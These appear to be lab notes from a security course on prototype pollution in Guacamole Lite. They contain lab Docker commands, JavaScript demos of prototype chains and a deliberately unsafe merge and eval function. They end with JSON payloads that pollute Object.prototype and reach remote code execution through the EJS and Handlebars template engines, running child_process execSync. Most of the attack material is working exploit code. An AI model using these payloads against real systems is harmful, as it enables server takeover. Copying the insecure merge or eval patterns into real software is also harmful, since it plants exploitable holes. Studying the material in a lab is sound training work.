Guacamole Lite Prototype Pollution
=======

## Docker Commands

### Shut down the chips application
```
docker-compose -f ~/chips/docker-compose.yml down
```

### Start the chips application but using the EJS template
```
TEMPLATING_ENGINE=ejs docker-compose -f ~/chips/docker-compose.yml up
```

### Start the chips application but using the handlebars template
```
TEMPLATING_ENGINE=hbs docker-compose -f ~/chips/docker-compose.yml up
```

### Start the chips application but using the Pug template
```
TEMPLATING_ENGINE=pug docker-compose -f ~/chips/docker-compose.yml up
```

### Start Interactive Node shell in chips with debugging
```
docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
```

## Other Commands

**Download Code**

```
rsync -az --compress-level=1 student@chips:/home/student/chips/ chips/
```


## Javascript Snippets

### Student Class

```javascript
class Student {
	constructor() {
		this.id = 1;
		this.enrolled = true
	}
	isActive() {
		console.log("Checking if active")
		return this.enrolled
	}
}
```

### Student Constructor Method

```javascript
function Student() {
	this.id = 2;
	this.enrolled = false
}

Student.prototype.isActive = function() {
	console.log("Checking if active")
	return this.enrolled;
};
```

### New isActive Funtion
```javascript
s.isActive = function(){
	console.log("New isActive");
	return true;
}
```

### Updated isActive in Student
```javascript
Student.prototype.isActive = function () {
	console.log("Updated isActive in Student");
	return this.enrolled;
}
```

### Student toString
```javascript
Student.prototype.toString = function () {
	console.log("in Student prototype");
	return this.id.toString();
}
```

### s Object toString
```javascript
s.toString = function () {
	console.log("in s object");
	return this.id.toString();
}
```

### Object prototype toString
```javascript
Object.prototype.toString = function () {
	console.log("in Object prototype")
	return this.id.toString();
}
```

### Merge Function
```javascript
const { isObject } = require("util");   

function merge(a,b) {
	for (var key in b){
		if (isObject(a[key]) && isObject(b[key])) {
			merge(a[key], b[key])
		}else {
			a[key] = b[key];
		}
	}
	return a
}
```

### Bad Merge Function
```javascript
function badMerge (a,b) {
  for (var key in b) {
    a[key] = b[key]; 
  }
  return a
}
```

### Custom Escape function
```javascript
o = {
	"escape" : function (x) {
		console.log("Running escape");
		return x;
	} 
}
```

### RunCode Function

```
function runCode (code, o) {
  let logCode = ""
  if (o.log){
    if (o.preface){
      logCode = "console.log('" + o.preface + "');"
    }
    logCode += "console.log('Running Eval');"
  }
  eval(logCode + code);
}

runCode("console.log('Running some random code')", {"log": true})
```

### Proto injection for RunCode

```
{}.__proto__.preface = "');console.log('RUNNING ANY CODE WE WANT')//"
```

### EJS initialization
```
ejs  = require("ejs")

let template = ejs.compile("Hello, <%= foo %>", {})
template({"foo":"world"})

ejs.render("Hello, <%= foo %>", {"foo":"world"})

```

### Handlebars initialization
```
Handlebars = require("handlebars")

ast = Handlebars.parse("hello {{ foo }}")
precompiled = Handlebars.precompile(ast)
eval("compiled = " + precompiled)
hello = Handlebars.template(compiled)
hello({"foo": "student"})
```

### pendingContent proto pollution

```
{}.__proto__.pendingContent = "haxhaxhax"
```

### NumberLiteral console.log

```
ast.body[0].params[1].value = "console.log('haxhaxhax')"
```

### Body Attribute in Prototype

```
{}.__proto__.body = []
```

### Body with Mustache

```
{}.__proto__.body = [{type: 'MustacheStatement'}]
```

### Prototype Body with path

```
{}.__proto__.body = [{type: 'MustacheStatement', path:0}]
```

### Prototype with loc

```
{}.__proto__.body = [{type: 'MustacheStatement', path:0, loc: 0}]
```

### Protype with params

```
{}.__proto__.body = [{type: 'MustacheStatement', path:0, loc: 0, params: [ { type: 'NumberLiteral', value: "console.log('haxhaxhax')" } ]}]
```

### Template with Literal

```
ast = Handlebars.parse('{{someHelper "some string" 12345 true undefined null}}')
ast.body[0].params[1]
```

## Payloads

### Blackbox discovery

```json
{
	"connection": {
		"type": "rdp",
		"settings": {
			"__proto__": {
				"toString": "hello"
			},
			"hostname": "rdesktop",
			"username": "abc",
			"password": "abc",
			"port": "3389",
			"security": "any",
			"ignore-cert": "true",
			"client-name": "",
			"console": "false",
			"initial-program": ""
		}
	}
}
```

### EJS PoC Payload

```json
{
	"connection":{
		"type":"rdp",
		"settings":{
			"hostname":"rdesktop",
			"username":"abc",
			"password":"abc",
			"port":"3389",
			"security":"any",
			"ignore-cert":"true",
			"client-name":"",
			"console":"false",
			"initial-program":"",
			"__proto__": 
			{
				"escape": "foobar"
			}
		}
	}
}
```

### EJS RCE Payload

```json
{
	"connection":{
		"type":"rdp",
		"settings":{
			"hostname":"rdesktop",
			"username":"abc",
			"password":"abc",
			"port":"3389",
			"security":"any",
			"ignore-cert":"true",
			"client-name":"",
			"console":"false",
			"initial-program":"",
			"__proto__":
			{
				"outputFunctionName":   "x = 1; console.log(process.mainModule.require('child_process').execSync('whoami').toString()); y"
			}
		}
	}
}
```

### Handlebars PoC Payload

```json
{
	"connection":{
		"type":"rdp",
		"settings":{
			"hostname":"rdesktop",
			"username":"abc",
			"password":"abc",
			"port":"3389",
			"security":"any",
			"ignore-cert":"true",
			"client-name":"",
			"console":"false",
			"initial-program":"",
			"__proto__": 
			{
				"pendingContent": "haxhaxhax"
			}
		}
	}
}
```

### Handlebars RCE Payload

```json
{
	"connection":{
		"type":"rdp",
		"settings":{
			"hostname":"rdesktop",
			"username":"abc",
			"password":"abc",
			"port":"3389",
			"security":"any",
			"ignore-cert":"true",
			"client-name":"",
			"console":"false",
			"initial-program":"",
			"__proto__": 
			{
				"type": "Program",
				"body":[
					{
						"type": "MustacheStatement",
						"path":0,
						"loc": 0,
						"params":[
							{
								"type": "NumberLiteral",
								"value": "console.log(process.mainModule.require('child_process').execSync('whoami').toString())" 
							} 
						]
					}
				]
			}
		}
	}
}
```